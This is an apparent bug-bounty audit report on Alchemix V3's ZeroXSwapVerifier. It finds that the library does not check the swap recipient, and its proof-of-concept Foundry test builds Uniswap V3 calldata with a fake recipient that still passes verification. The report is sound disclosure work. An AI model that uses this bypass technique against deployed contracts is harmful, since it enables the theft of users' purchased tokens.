# 57866 sc low failure to verify the recipient s address can result in the theft of purchased tokens

**Submitted on Oct 29th 2025 at 10:02:12 UTC by @pashap9990 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57866
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Finding Description and Impact

It is possible to verify fetched calldata from zero protocol by using the library `ZeroXSwapVerifier`. With the correct calldata, an executor can then execute a swap in Uniswap V3 by calling `Settler::execute`. However, the executor's assets are stolen by a malicious user because the library failed to verify the recipient's address.

### Code Snippet

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/utils/ZeroXSwapVerifier.sol#L99> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/utils/ZeroXSwapVerifier.sol#L209> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/utils/ZeroXSwapVerifier.sol#L225> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/utils/ZeroXSwapVerifier.sol#L264>

Furthermore, recipient's address should be checked in `ZeroXSwapVerifier::_verifyRFQVIP` and `ZeroXSwapVerifier::_verifyVelodromeV2VIP`

## Proof of Concept

## Proof of Concept

Kindly apply git patch below

```diff
diff --git a/src/test/ZeroXSwapVerifier.t.sol b/src/test/ZeroXSwapVerifier.t.sol
index 2c839d0..dc84b5a 100644
--- a/src/test/ZeroXSwapVerifier.t.sol
+++ b/src/test/ZeroXSwapVerifier.t.sol
@@ -6,6 +6,37 @@ import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {TestERC20} from "./mocks/TestERC20.sol";
 

 contract ZeroXSwapVerifierTest is Test {
     TestERC20 internal token;
     address constant owner = address(1);
@@ -58,6 +89,17 @@ contract ZeroXSwapVerifierTest is Test {
         );
         assertTrue(verified);
     }
+
+    function testVerifyUniswapFakeReceiver() public {
+        bytes memory _calldata = _buildUniswapV3VIPFakeReceiverCalldata(token, spender, 300); // 300 bps = 3% slippage
+        bool verified = ZeroXSwapVerifier.verifySwapCalldata(
+            _calldata,
+            owner, 
+            address(token), 
+            1000 // 1000 bps = 10% max slippage
+        );
+        assertTrue(verified);
+    }
     

     
+
+    function _buildUniswapV3VIPFakeReceiverCalldata(TestERC20 _token, address recipient, uint256 bps) internal returns (bytes memory) {
+        address fake = makeAddr("fake");
+        bytes memory fills = abi.encode(address(_token), 100e18);
+        bytes memory action = abi.encodeWithSelector(
+            UNISWAPV3_VIP,
+            recipient,
+            bps, // bps
+            3000, // feeOrTickSpacing
+            false, // feeOnTransfer
+            fills
+        );
+        
+        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
+            recipient: fake,
+            buyToken: address(0),
+            minAmountOut: 0,
+            actions: new bytes[](1)
+        });
+        saa.actions[0] = action;
+        
+        return abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));
+    }
     
  
 }

```
